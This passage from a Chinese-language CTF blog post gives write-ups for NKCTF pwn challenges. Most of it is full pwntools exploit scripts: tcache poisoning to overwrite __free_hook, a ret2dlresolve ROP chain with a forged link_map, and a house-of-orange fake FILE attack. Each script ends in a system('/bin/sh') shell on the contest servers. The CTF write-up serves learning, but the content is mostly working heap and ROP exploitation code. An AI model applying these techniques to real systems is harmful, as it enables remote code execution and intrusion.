class="line">edit(1, &#x27;a&#x27;*0x49 + &#x27;b&#x27;*0x8)</span><br><span class="line"></span><br><span class="line">show(1)</span><br><span class="line"></span><br><span class="line"># sh.recvuntil(&#x27;b&#x27;*0x8)</span><br><span class="line">libc.address = u64(sh.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8, &#x27;\x00&#x27;)) - 0x10 - 96 - libc.sym[&#x27;__malloc_hook&#x27;] - 0x62</span><br><span class="line">print(&quot;libc.address: &quot; + hex(libc.address))</span><br><span class="line"></span><br><span class="line">system = libc.sym[&#x27;system&#x27;]</span><br><span class="line">__free_hook = libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line"></span><br><span class="line">edit(1, &#x27;a&#x27;*0x48 + p64(0x451) + &quot;\x00&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(9, 0x57)</span><br><span class="line">delete(6)</span><br><span class="line">delete(5)</span><br><span class="line"></span><br><span class="line">edit(9, &#x27;a&#x27;*0x50 + &#x27;b&#x27;*0x8)</span><br><span class="line">show(9)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#x27;b&#x27;*0x8)</span><br><span class="line"></span><br><span class="line">tcache = u64(sh.recv(6).ljust(8, &#x27;\x00&#x27;))</span><br><span class="line">print(&quot;tcache: &quot; + hex(tcache))</span><br><span class="line"></span><br><span class="line">__free_hook = ((tcache + 0x380) &gt;&gt; 12) ^ __free_hook</span><br><span class="line"></span><br><span class="line">edit(9, &#x27;a&#x27;*0x48 + p64(0x101) + p64(__free_hook))</span><br><span class="line"></span><br><span class="line">add(10, 0xf8)</span><br><span class="line">add(11, 0xf8)</span><br><span class="line"></span><br><span class="line">edit(11, p64(system) + &#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">edit(3, &#x27;/bin/sh\x00&#x27; + &#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line"># gdb.attach(sh)</span><br><span class="line"># pause()</span><br><span class="line">delete(3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="only-read"><a href="#only-read" class="headerlink" title="only_read"></a>only_read</h3><p>​	ret2dlresolve是我一直拖着还没学的技巧，结果这次碰上了（现学没什么时间了，只剩一个多小时结束晕），利用理解得还不完全透彻（比赛时借用了狒猩橙师傅的脚本一把梭了，强）</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pwnfeifei/p/15701859.html">ret2dl_resolve - 狒猩橙 - 博客园 (cnblogs.com)</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import base64</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"># sh = process(&#x27;./pwn&#x27;)</span><br><span class="line">sh = remote(&#x27;node2.yuzhian.com.cn&#x27;, 31167)</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line">payload = base64.b64encode(&#x27;Welcome to NKCTF!&#x27;)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">payload = base64.b64encode(&quot;tell you a secret:&quot;)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">payload = base64.b64encode(&quot;I&#x27;M RUNNING ON GLIBC 2.31-0ubuntu9.9&quot;)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">payload = base64.b64encode(&quot;can you find me?&quot;)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">plt0 = elf.get_section_by_name(&#x27;.plt&#x27;).header.sh_addr</span><br><span class="line">l_addr=libc.sym[&#x27;system&#x27;] - libc.sym[&#x27;read&#x27;]</span><br><span class="line">st_value=elf.got[&#x27;read&#x27;]</span><br><span class="line"></span><br><span class="line">def get_fake_link_map(fake_link_map_addr,l_addr,st_value):</span><br><span class="line">    #the address of each fake pointer</span><br><span class="line">    fake_Elf64_Dyn_STR_addr=p64(fake_link_map_addr)</span><br><span class="line">    fake_Elf64_Dyn_SYM_addr=p64(fake_link_map_addr+0x8)</span><br><span class="line">    fake_Elf64_Dyn_JMPREL_addr=p64(fake_link_map_addr+0x18)</span><br><span class="line">    #fake structure</span><br><span class="line">    fake_Elf64_Dyn_SYM =p64(0)+p64(st_value-0x8)</span><br><span class="line">    fake_Elf64_Dyn_JMPREL = p64(0)+p64(fake_link_map_addr+0x28)</span><br><span class="line">    r_offset = fake_link_map_addr - l_addr</span><br><span class="line">    fake_Elf64_rela =p64(r_offset)+p64(0x7)+p64(0)</span><br><span class="line">    #fake_link_map</span><br><span class="line">    fake_link_map =p64(l_addr&amp;(2**64-1))# 0x8</span><br><span class="line">    fake_link_map+=fake_Elf64_Dyn_SYM   # 0x18  </span><br><span class="line">    fake_link_map+=fake_Elf64_Dyn_JMPREL# 0x28</span><br><span class="line">    fake_link_map+=fake_Elf64_rela      # 0x40</span><br><span class="line">    fake_link_map+=b&quot;\x00&quot;*0x28         # 0x68</span><br><span class="line">    fake_link_map+=fake_Elf64_Dyn_STR_addr     # STRTAB pointer,0x70</span><br><span class="line">    fake_link_map+=fake_Elf64_Dyn_SYM_addr     # SYMTAB pointer,0x78</span><br><span class="line">    fake_link_map+=b&quot;/bin/sh\x00&quot;.ljust(0x80,b&#x27;\x00&#x27;) # 0xf8</span><br><span class="line">    fake_link_map+=fake_Elf64_Dyn_JMPREL_addr  # JMPREL pointer    </span><br><span class="line">    return fake_link_map</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = 0x0000000000401683</span><br><span class="line">pop_rsi_r15_ret = 0x0000000000401681</span><br><span class="line">ret = 0x000000000040101a</span><br><span class="line">fake_link_map_addr = 0x404060</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">fake_link_map=get_fake_link_map(fake_link_map_addr,l_addr,st_value)</span><br><span class="line"> </span><br><span class="line">payload = b&#x27;\x00&#x27;*0x38 + p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(fake_link_map_addr) + p64(0) + p64(elf.plt[&#x27;read&#x27;])</span><br><span class="line">payload += p64(ret) + p64(pop_rdi_ret) + p64(fake_link_map_addr+0x78) + p64(plt0+6) + p64(fake_link_map_addr) + p64(0)</span><br><span class="line">payload = payload.ljust(0x200, b&#x27;\x00&#x27;)</span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.send(fake_link_map)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="ByteDance"><a href="#ByteDance" class="headerlink" title="ByteDance"></a>ByteDance</h3><p>​	看出了洞（一开始以为是off by one，结果实践是off by null？），利用还没啥想法，查malloc_consolidate时，就不小心find原题了额（碰巧house of orange是我IO目前唯一会的，真不敢想还会在比赛碰到^_^）（照着某位师傅的博客过了遍（都可以算复现了应该是，晕））</p>
<p>（2018-hctf-heapstorm，甚至脚本能直接拿来应该，额）</p>
<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903816031125518#heading-8">PWN题目中malloc_consolidate()利用浅析 - 掘金 (juejin.cn)</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line"># context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line"># sh = process(&#x27;./pwn02&#x27;)</span><br><span class="line">sh = remote(&#x27;node2.yuzhian.com.cn&#x27;, 30910)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line">def menu(choice):</span><br><span class="line">    sh.sendlineafter(&quot;Choice:&quot;, str(choice))</span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">    menu(1)</span><br><span class="line">    sh.sendlineafter(&quot;Please input chunk size:&quot;, str(size))</span><br><span class="line">    sh.sendlineafter(&quot;Please input chunk content:&quot;, content)</span><br><span class="line"></span><br><span class="line">def add2(size, content):</span><br><span class="line">    menu(1)</span><br><span class="line">    sh.sendlineafter(&quot;Please input chunk size:&quot;, str(size))</span><br><span class="line">    sh.sendafter(&quot;Please input chunk content:&quot;, content)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    menu(2)</span><br><span class="line">    sh.sendlineafter(&quot;Please input chunk index:&quot;, str(index))</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    menu(3)</span><br><span class="line">    sh.sendlineafter(&quot;Please input chunk index: &quot;, str(index))</span><br><span class="line"></span><br><span class="line">def leak():</span><br><span class="line">    sh.recvuntil(&quot;Content: &quot;)</span><br><span class="line">    recv = u64(sh.recv(6).ljust(8, &#x27;\x00&#x27;))</span><br><span class="line">    print(&quot;recv: &quot; + hex(recv))</span><br><span class="line">    return recv</span><br><span class="line"></span><br><span class="line"># off by null?</span><br><span class="line"># max_count = 32</span><br><span class="line"></span><br><span class="line">for i in range(11):     #0-10</span><br><span class="line">    add(0x37,&#x27;\x00&#x27;*0x37)</span><br><span class="line"></span><br><span class="line">for i in range(5):      #(0-4)</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&quot;Choice:&quot;, &#x27;1&#x27;*0x500)</span><br><span class="line"></span><br><span class="line"># gdb.attach(sh)</span><br><span class="line"># pause()</span><br><span class="line"></span><br><span class="line">add(0x28,&#x27;\x00&#x27;*0x28)   #0</span><br><span class="line"></span><br><span class="line"># pause()</span><br><span class="line"></span><br><span class="line">add(0x37,&#x27;\x00&#x27;*0x37)   #1</span><br><span class="line">add(0x17,&#x27;\x00&#x27;*0x17)   #2</span><br><span class="line">add(0x37,&#x27;\x00&#x27;*0x37)   #3</span><br><span class="line">add(0x37,&#x27;\x00&#x27;*0x37)   #4</span><br><span class="line">add(0x17,&#x27;\x00&#x27;*0x17)   #11</span><br><span class="line"></span><br><span class="line"># pause()</span><br><span class="line"></span><br><span class="line">delete(5)       #(5)</span><br><span class="line">delete(1)       #(1)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&quot;Choice:&quot;, &#x27;1&#x27;*0x500)</span><br><span class="line"></span><br><span class="line">add(0x37,&#x27;\x00&#x27;*0x37)    #1</span><br><span class="line"></span><br><span class="line">show(2)</span><br><span class="line">libc.address = leak() - 88 - 0x10 - libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">print(&quot;libc.address: &quot; + hex(libc.address))</span><br><span class="line"></span><br><span class="line">add(0x17,&#x27;\x00&#x27;*0x17)   #5 = 2</span><br><span class="line">add(0x17,&#x27;\x00&#x27;*0x17)   #12</span><br><span class="line"></span><br><span class="line">delete(12)</span><br><span class="line">delete(5)</span><br><span class="line"></span><br><span class="line">show(2)</span><br><span class="line">heap = leak() - 0x90</span><br><span class="line">print(&quot;heap: &quot; + hex(heap))</span><br><span class="line"></span><br><span class="line">_IO_list_all = libc.sym[&#x27;_IO_list_all&#x27;]</span><br><span class="line"></span><br><span class="line"># gdb.attach(sh)</span><br><span class="line"># pause()</span><br><span class="line"></span><br><span class="line">delete(4)</span><br><span class="line"></span><br><span class="line"># pause()</span><br><span class="line">add(0x27,&#x27;\x00&#x27;*0x18+p64(0x41)+&#x27;\x00&#x27;*7)</span><br><span class="line"></span><br><span class="line"># pause()</span><br><span class="line"></span><br><span class="line">fake_file = &#x27;/bin/sh\x00&#x27;+p64(0x61) # fake_file</span><br><span class="line">fake_file += p64(0)+p64(_IO_list_all-0x10) #unsorted bin attack</span><br><span class="line">fake_file += p64(0)+p64(1) #bypass check</span><br><span class="line">fake_file = fake_file.ljust(0x38,&#x27;\x00&#x27;)</span><br><span class="line">add(0x38,fake_file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># pause()</span><br><span class="line">delete(6)</span><br><span class="line"></span><br><span class="line"># pause()</span><br><span class="line">payload_1 = &#x27;\x00&#x27;*0x28 + p64(heap+0x1d0) # point to fake_vtable</span><br><span class="line">payload_1 = payload_1.ljust(0x37,&#x27;\x00&#x27;)</span><br><span class="line">add(0x37,payload_1)</span><br><span class="line"></span><br><span class="line"># pause()</span><br><span class="line">delete(7)</span><br><span class="line"></span><br><span class="line"># pause()</span><br><span class="line">system = libc.sym[&#x27;system&#x27;]</span><br><span class="line">payload_2 = p64(0)*3 + p64(system) # fake_vtable</span><br><span class="line">payload_2 = payload_2.ljust(0x37,&#x27;\x00&#x27;)</span><br><span class="line">add(0x37,payload_2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># pause()</span><br><span class="line">menu(1)</span><br><span class="line">sh.sendlineafter(&quot;Please input chunk size:&quot;, str(0x30))</span><br><span class="line"># gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="note"><a href="#note" class="headerlink" title="note"></a>note</h3><p>​	看到堆溢出，结果是musl pwn（裂，差此一题ak（虽然实力完全不匹配哈哈哈），早知道HWS的时候就好好听ccx师傅讲musl了（那时候还是天书），晕）</p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/PWN/" rel="tag"># -PWN</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2023/03/10/mp-tcache-bins/" rel="prev" title="mp_.tcache_bins">
      <i class="fa fa-chevron-left"></i> mp_.tcache_bins
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#ezshellcode"><span class="nav-number">1.</span> <span class="nav-text">ezshellcode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#a-story-of-a-pwner"><span class="nav-number">2.</span> <span class="nav-text">a_story_of_a_pwner</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ez-stack"><span class="nav-number">3.</span> <span class="nav-text">ez_stack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#baby-rop"><span class="nav-number">4.</span> <span class="nav-text">baby_rop</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9961code"><span class="nav-number">5.</span> <span class="nav-text">9961code</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#baby-heap"><span class="nav-number">6.</span> <span class="nav-text">baby_heap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#only-read"><span class="nav-number">7.</span> <span class="nav-text">only_read</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ByteDance"><span class="nav-number">8.</span> <span class="nav-text">ByteDance</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#note"><span class="nav-number">9.</span> <span class="nav-text">note</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="hhhhhh_"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">hhhhhh_</p>
  <div class="site-description" itemprop="description">想去北方看看</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">6</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">hhhhhh_</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  
  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
